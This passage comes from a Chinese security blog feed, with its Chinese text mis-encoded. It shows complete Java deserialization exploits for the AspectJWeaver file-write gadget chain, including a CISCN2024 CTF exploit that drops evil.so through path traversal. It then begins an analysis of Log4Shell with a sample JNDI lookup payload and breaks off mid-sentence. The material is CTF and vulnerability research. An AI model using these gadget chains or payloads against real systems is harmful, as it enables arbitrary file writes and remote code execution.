class="hljs-operator">=</span> (HashMap)con.newInstance(<span class="hljs-string">&quot;C:&quot;</span>, <span class="hljs-number">1</span>);<br>        <span class="hljs-comment">// è¿™é‡Œç”¨åˆ°ConstantTransformeræ˜¯ä¸ºäº†æ„é€ valueï¼Œå³å†™å…¥æ–‡ä»¶çš„å€¼</span><br>        <span class="hljs-type">ConstantTransformer</span> <span class="hljs-variable">transform</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-string">&quot;EddieMurphy&quot;</span>.getBytes(StandardCharsets.UTF_8));<br>        <span class="hljs-comment">// è¿”å›ä¸€ä¸ªLazyMapå¯¹è±¡</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">outmap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map,transform);<br>        <span class="hljs-comment">// åˆ©ç”¨TiedMapEntryå’ŒBadAttributeValueExpExceptionï¼Œä½¿ååºåˆ—åŒ–BadAttributeValueExpExceptionå¯¹è±¡çš„æ—¶å€™è§¦å‘LazyMapçš„getæ–¹æ³•</span><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedmap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(outmap,<span class="hljs-string">&quot;Users\\75279\\Desktop\\1.jsp&quot;</span>);<br>        <span class="hljs-comment">// è¿™é‡Œæ˜¯ä¸ºäº†åºåˆ—åŒ–æ—¶ä¸è§¦å‘LazyMapçš„getæ–¹æ³•</span><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">poc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        val.setAccessible(<span class="hljs-literal">true</span>);<br>        val.set(poc,tiedmap);<br><br>        <span class="hljs-comment">// åºåˆ—åŒ–</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(out);<br>        oos.writeObject(poc);<br>        System.out.println(Base64.getEncoder().encodeToString(out.toByteArray()));<br>        <span class="hljs-comment">// ååºåˆ—åŒ–</span><br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(out.toByteArray());<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(in);<br>        ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="CC6æ”¹é“¾"><a href="#CC6æ”¹é“¾" class="headerlink" title="CC6æ”¹é“¾"></a>CC6æ”¹é“¾</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.nio.charset.StandardCharsets;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AJCC6</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// åå°„è·å–æ„é€ å‡½æ•°</span><br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">con</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap&quot;</span>).getDeclaredConstructor(String.class,<span class="hljs-type">int</span>.class);<br>        con.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">// å®ä¾‹åŒ–å¯¹è±¡</span><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> (HashMap)con.newInstance(<span class="hljs-string">&quot;C:&quot;</span>, <span class="hljs-number">1</span>);<br>        <span class="hljs-comment">// è¿™é‡Œç”¨åˆ°ConstantTransformeræ˜¯ä¸ºäº†æ„é€ valueï¼Œå³å†™å…¥æ–‡ä»¶çš„å€¼</span><br>        <span class="hljs-type">ConstantTransformer</span> <span class="hljs-variable">transform</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-string">&quot;EddieMurphy&quot;</span>.getBytes(StandardCharsets.UTF_8));<br>        <span class="hljs-comment">// è¿”å›ä¸€ä¸ªLazyMapå¯¹è±¡</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">outmap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map,transform);<br>        <span class="hljs-comment">// åˆ©ç”¨TiedMapEntryå’ŒBadAttributeValueExpExceptionï¼Œä½¿ååºåˆ—åŒ–BadAttributeValueExpExceptionå¯¹è±¡çš„æ—¶å€™è§¦å‘LazyMapçš„getæ–¹æ³•</span><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedmap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(outmap,<span class="hljs-string">&quot;Users\\75279\\Desktop\\1.jsp&quot;</span>);<br>        <span class="hljs-comment">// è¿™é‡Œæ˜¯ä¸ºäº†åºåˆ—åŒ–æ—¶ä¸è§¦å‘LazyMapçš„getæ–¹æ³•</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        expMap.put(tiedmap, <span class="hljs-string">&quot;xxx&quot;</span>);<br><br>        <span class="hljs-comment">// åºåˆ—åŒ–</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(out);<br>        oos.writeObject(expMap);<br>        System.out.println(Base64.getEncoder().encodeToString(out.toByteArray()));<br>        <span class="hljs-comment">// ååºåˆ—åŒ–</span><br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(out.toByteArray());<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(in);<br>        ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/08/09/AspectJWeaver/image-20240809210524825.png" alt="image-20240809210524825"></p><p>æœ€åè¡¥å……ä¸€ä¸‹å›½èµ›é‚£é“é¢˜ç”¨çš„<code>AspectJWeaver</code>å†™å…¥æ¶æ„soæ–‡ä»¶çš„EXPï¼Œå®Œæ•´åˆèµ›wpå¯è§<a href="https://www.cnblogs.com/EddieMurphy-blogs/p/18201664">CISCN2024-WEB-wp - Eddie_Murphy - åšå®¢å›­ (cnblogs.com)</a>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> com.example.jdbctest.bean.UserBean;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Path;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp</span> &#123;<br>    <span class="hljs-comment">// è·å–æŒ‡å®šç±»çš„ç¬¬ä¸€ä¸ªæ„é€ å‡½æ•°ï¼Œå¹¶è®¾ç½®ä¸ºå¯è®¿é—®</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Constructor&lt;?&gt; getCtor(<span class="hljs-keyword">final</span> String name) <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">final</span> Constructor&lt;?&gt; ctor = Class.forName(name).getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        ctor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-keyword">return</span> ctor;<br>    &#125;<br><br>    <span class="hljs-comment">// åˆ›å»ºä¸€ä¸ªUserBeanå¯¹è±¡ï¼Œå°†evil.soçš„å†…å®¹Base64ç¼–ç åå­˜å…¥UserBeanä¸­</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getObject</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">filename</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;../../../../../../../../../../../../tmp/evil.so&quot;</span>; <span class="hljs-comment">// è·¯å¾„æŒ‡å‘/tmp/evil.so</span><br>        <span class="hljs-type">Path</span> <span class="hljs-variable">filePath</span> <span class="hljs-operator">=</span> Paths.get(<span class="hljs-string">&quot;F:\\CTF_Java\\CISCN2024\\src\\main\\java\\com\\eddiemurphy\\evil.so&quot;</span>); <span class="hljs-comment">// å‡è®¾evil.soä½äºå½“å‰ç›®å½•</span><br>        <span class="hljs-type">byte</span>[] fileBytes = Files.readAllBytes(filePath); <span class="hljs-comment">// è¯»å–æ–‡ä»¶å­—èŠ‚</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">content</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(fileBytes); <span class="hljs-comment">// å°†æ–‡ä»¶å†…å®¹Base64ç¼–ç </span><br>        <span class="hljs-type">UserBean</span> <span class="hljs-variable">bean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserBean</span>(filename, content); <span class="hljs-comment">// åˆ›å»ºUserBeanå®ä¾‹</span><br>        Constructor&lt;?&gt; ctor = getCtor(<span class="hljs-string">&quot;org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap&quot;</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">simpleCache</span> <span class="hljs-operator">=</span> ctor.newInstance(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-number">12</span>); <span class="hljs-comment">// å®ä¾‹åŒ–ä¸€ä¸ªSimpleCacheå¯¹è±¡</span><br>        bean.setObj(simpleCache); <span class="hljs-comment">// å°†SimpleCacheå¯¹è±¡è®¾ç½®ä¸ºUserBeançš„objå±æ€§</span><br>        <span class="hljs-keyword">return</span> bean;<br>    &#125;<br><br>    <span class="hljs-comment">// åºåˆ—åŒ–ä¸€ä¸ªå¯¹è±¡åˆ°å­—èŠ‚æ•°ç»„</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] serialize(Object object) <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(object);<br>        oos.close();<br>        <span class="hljs-keyword">return</span> baos.toByteArray();<br>    &#125;<br><br>    <span class="hljs-comment">// ä¸»å‡½æ•°ï¼Œåºåˆ—åŒ–å¯¹è±¡å¹¶å°†å…¶å†™å…¥æ–‡ä»¶</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] serialized = serialize(getObject()); <span class="hljs-comment">// åºåˆ—åŒ–å¯¹è±¡</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">fileName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;F:\\CTF_Java\\CISCN2024\\src\\main\\java\\com\\eddiemurphy\\output.ser&quot;</span>; <span class="hljs-comment">// è¾“å‡ºæ–‡ä»¶å</span><br><br>        <span class="hljs-comment">// ä½¿ç”¨FileOutputStreamå°†å­—èŠ‚æ•°æ®å†™å…¥æ–‡ä»¶</span><br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(fileName);<br>        fos.write(serialized);<br>        fos.close(); <span class="hljs-comment">// å…³é—­æ–‡ä»¶è¾“å‡ºæµ</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å‚è€ƒï¼š</p><p><a href="https://p4d0rn.gitbook.io/java/serial-journey/aspectjweaver">AspectJWeaver | Java (gitbook.io)</a></p><p><a href="https://blog.csdn.net/uuzeray/article/details/136595841">ã€Webã€‘æµ…èŠJavaååºåˆ—åŒ–ä¹‹AspectJWeaverâ€”â€”ä»»æ„æ–‡ä»¶å†™å…¥-CSDNåšå®¢</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Log4j</title>
    <link href="/2024/08/08/Log4j/"/>
    <url>/2024/08/08/Log4j/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>Log4jæ¼æ´è¢«ç§°ä¸ºå¯è½½å…¥å²å†Œçš„é‡Œç¨‹ç¢‘å¼é¡¶çº§ä¾›åº”é“¾æ¼æ´ã€‚</p><p>2021å¹´åº•ï¼ŒLog4j æ¼æ´æ¨ªç©ºå‡ºä¸–ï¼Œåœ¨å®‰å…¨åœˆå¼•èµ·äº†è½©ç„¶å¤§æ³¢ï¼Œå¯ä»¥è¯´æ˜¯æ ¸å¼¹çº§åˆ«çš„æ¼æ´ï¼Œæ— è®ºæ˜¯æ¸—é€ã€ç ”å‘ã€å®‰æœã€ç ”ç©¶ï¼Œæ‰€æœ‰äººéƒ½åœ¨å­¦ä¹ å’Œå¤ç°è¿™ä¸ªæ¼æ´ï¼Œç”±äºå…¶è¦†ç›–é¢å¹¿ï¼Œå¼•ç”¨æ¬¡æ•°åºå¤§ï¼Œç›´æ¥æˆä¸ºå¯ä»¥ä¸æ°¸æ’ä¹‹è“é½åçš„é¡¶çº§å¯åˆ©ç”¨æ¼æ´ï¼Œå®˜æ–¹ CVSS è¯„åˆ†æ›´æ˜¯ç›´æ¥é¡¶åˆ° 10.0ï¼Œå›½å†…æœ‰å‚å•†å°†å…¶å‘½åä¸ºâ€œæ¯’æ—¥å¿—â€ï¼Œå›½å¤–å°†å…¶å‘½åä¸º Log4Shellã€‚</p><p>Apache log4j2æ˜¯ä¸€æ¬¾ç”¨äº Java æ—¥å¿—è®°å½•çš„å·¥å…·ã€‚æ—¥å¿—è®°å½•ä¸»è¦ç”¨æ¥ç›‘è§†ä»£ç ä¸­å˜é‡çš„å˜åŒ–æƒ…å†µï¼Œå‘¨æœŸæ€§åœ°è®°å½•åˆ°æ–‡ä»¶ä¸­ä¾›å…¶ä»–åº”ç”¨è¿›è¡Œç»Ÿè®¡åˆ†æå·¥ä½œï¼›è·Ÿè¸ªä»£ç è¿è¡Œæ—¶è½¨è¿¹ï¼Œä½œä¸ºæ—¥åå®¡è®¡çš„ä¾æ®ï¼›æ‹…å½“é›†æˆå¼€å‘ç¯å¢ƒä¸­çš„è°ƒè¯•å™¨çš„ä½œç”¨ï¼Œå‘æ–‡ä»¶æˆ–æ§åˆ¶å°æ‰“å°ä»£ç çš„è°ƒè¯•ä¿¡æ¯ã€‚å…¶åœ¨JAVAç”Ÿæ€ç¯å¢ƒä¸­åº”ç”¨æå…¶å¹¿æ³›,å½±å“å·¨å¤§ã€‚</p><p>æ¼æ´çš„è§¦å‘ç‚¹åœ¨äºåˆ©ç”¨<code>org.apache.logging.log4j.Logger</code>è¿›è¡Œ<code>log</code>æˆ–<code>error</code>ç­‰è®°å½•æ“ä½œæ—¶æœªå¯¹æ—¥å¿—messageä¿¡æ¯è¿›è¡Œæœ‰æ•ˆæ£€æŸ¥ï¼Œä»è€Œå¯¼è‡´æ¼æ´å‘ç”Ÿï¼Œè§¦å‘ç‚¹æ˜¯JNDIã€‚</p><p>å½±å“ç‰ˆæœ¬ï¼š<code>2.0 &lt;= Apache log4j2 &lt;= 2.14.1</code></p><h2 id="Basic-Usage"><a href="#Basic-Usage" class="headerlink" title="Basic Usage"></a>Basic Usage</h2><p>Add the dependencies listed below to your classpath.</p><blockquote><p>log4j-api.jar</p><p>log4j-core.jar</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>log4j-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.14.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>log4j-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.14.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.logging.log4j.LogManager;<br><span class="hljs-keyword">import</span> org.apache.logging.log4j.Logger;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Log4Vul</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">logger</span> <span class="hljs-operator">=</span> LogManager.getLogger();<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">food</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;taco&quot;</span>;<br>        logger.error(<span class="hljs-string">&quot;&#123;&#125; is not served&quot;</span>, food);<br>        <span class="hljs-comment">// 12:17:56.859 [main] ERROR Log4Vul - taco is not served</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>&#123;&#125;</code>èµ·åˆ°å ä½ç¬¦çš„ä½œç”¨ï¼Œè¢«æ›¿æ¢ä¸ºä¼ å…¥çš„å‚æ•°</p><p><code>log4j</code>æä¾›äº†ä¸€äº›<code>lookup</code>åŠŸèƒ½ï¼Œå¯ä»¥å¿«é€Ÿæ‰“å°ç¯å¢ƒå˜é‡ã€javaç‰ˆæœ¬ä¿¡æ¯ã€æ—¥å¿—äº‹ä»¶ã€è¿è¡Œå®¹å™¨ä¿¡æ¯ç­‰å†…å®¹ã€‚</p><p>å¦‚<code>logger.error(&quot;Java version :&#123;&#125;&quot;,&quot;$&#123;java:version&#125;&quot;);</code>å°†æ‰“å°javaç‰ˆæœ¬</p><p>å…·ä½“å¯ä»¥æŸ¥çœ‹[å®˜æ–¹æ–‡æ¡£](<a href="https://logging.apache.org/log4j/2.x/manual/lookups.html">Log4j â€“ Log4j 2 Lookups (apache.org)</a>)</p><p>å¯ä»¥çœ‹åˆ°æœ‰æ•æ„Ÿçš„<code>JndiLookup </code>ï¼Œé€šè¿‡jndiæ¥è·å–å˜é‡å€¼</p><p>åœ¨<code>log4j.core.lookup</code>å¯ä»¥æ‰¾åˆ°è¿™ä¸ªç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">lookup</span><span class="hljs-params">(<span class="hljs-keyword">final</span> LogEvent event, <span class="hljs-keyword">final</span> String key)</span> &#123;<br>    <span class="hljs-keyword">if</span> (key == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>    <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">jndiName</span> <span class="hljs-operator">=</span> convertJndiName(key);<br>    <span class="hljs-keyword">try</span> (<span class="hljs-keyword">final</span> <span class="hljs-type">JndiManager</span> <span class="hljs-variable">jndiManager</span> <span class="hljs-operator">=</span> JndiManager.getDefaultManager()) &#123;<br>        <span class="hljs-keyword">return</span> Objects.toString(jndiManager.lookup(jndiName), <span class="hljs-literal">null</span>);<br>    &#125; <span class="hljs-comment">// ....</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>jndiManager#lookup</code>æœ‰ç†Ÿæ‚‰çš„<code>this.context.lookup(name);</code>ï¼Œ<code>context</code>é»˜è®¤ä¸º<code>InitialContext</code></p><p>æ¥ç€çœ‹çœ‹<code>log4j</code>æ˜¯æ€ä¹ˆå¤„ç†æˆ‘ä»¬ä¼ å…¥çš„messageå¹¶è½¬åŒ–ä¸ºjndiçš„</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">MessagePatternConverter#format<br></code></pre></td></tr></table></figure><ul><li>åˆ¤æ–­æ˜¯å¦è®¾ç½®<code>noLookups</code>ï¼ˆåé¢è®²é˜²å¾¡å°±æ˜¯æŠŠè¿™ä¸ªå‚æ•°è®¾ä¸ºtrueï¼‰</li><li>åˆ¤æ–­æ˜¯å¦æœ‰<code>$&#123;</code></li><li>ä¼ å…¥<code>StrSubstitutor</code>è¿›è¡Œ<code>replace</code></li></ul><p><img src="/2024/08/08/Log4j/image-20240809190958652.png" alt="image-20240809190958652"></p><p>æŠŠ<code>$&#123;xxx&#125;</code>ä¸­é—´çš„å†…å®¹æå–å‡ºæ¥ï¼Œä¼ å…¥<code>resolveVariable</code>å¤„ç†ï¼Œåœ¨<code>Interpolator#lookup</code>ï¼ŒæŠŠç¬¬ä¸€ä¸ª<code>:</code>å‰çš„å†…å®¹æå–å‡ºæ¥ï¼Œè¿™é‡Œå°±æ˜¯<code>jndi</code>ï¼Œåœ¨<code>strLookupMap</code>æ‰¾åˆ°å¯¹åº”çš„<code>Lookup</code>ç±»ï¼Œå³æ‰¾åˆ°<code>JndiLookup</code>ç±»ï¼Œç”¨è¿™ä¸ªç±»å»<code>lookup</code>åé¢çš„éƒ¨åˆ†ã€‚</p><p><img src="/2024/08/08/Log4j/image-20240809191616225.png" alt="image-20240809191616225"></p><p>ä¸Šé¢æ˜¯ä½¿ç”¨<code>logger.error()</code>è§¦å‘çš„ï¼Œæ—¥å¿—ç­‰çº§é»˜è®¤200ã€‚</p><p>ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œå¦‚<code>logger.log(Level.INFO, &quot;$&#123;jndi:ldap://127.0.0.1:8099/666&#125;&quot;);</code></p><p>ä¼šç»è¿‡<code>logIfEnabled()</code>çš„åˆ¤æ–­ã€‚</p><p><img src="/2024/08/08/Log4j/image-20240809191642961.png" alt="image-20240809191642961"></p><p>å¦‚æœæ—¥å¿—ç­‰çº§çš„å€¼æ²¡æœ‰å°äº200ï¼ˆå€¼è¶Šå°ç­‰çº§è¶Šé«˜ï¼‰ï¼Œå°±ä¸ä¼šè¿›å…¥<code>logMessage</code>æ¥æ‰“å°æ¶ˆæ¯ï¼š</p><p><img src="/2024/08/08/Log4j/image-20240809191719075.png" alt="image-20240809191719075"></p><p>æ‰€ä»¥åªæœ‰<code>OFF(0)ã€FATAL(100)ã€ERROR(200)</code>æ‰èƒ½åˆ©ç”¨</p><p>ä»£ç ä¸­æ—¥å¿—ç­‰çº§çš„ä¼˜å…ˆçº§â‰¥é»˜è®¤çº§åˆ«æ‰å¯ä»¥æˆåŠŸï¼Œæ¯”å¦‚Struts2çš„é»˜è®¤æ—¥å¿—ç­‰çº§ä¸ºInfo(400)ï¼ŒWARN(300)ã€ERRORã€FATALã€OFFã€INFOè¿™å‡ 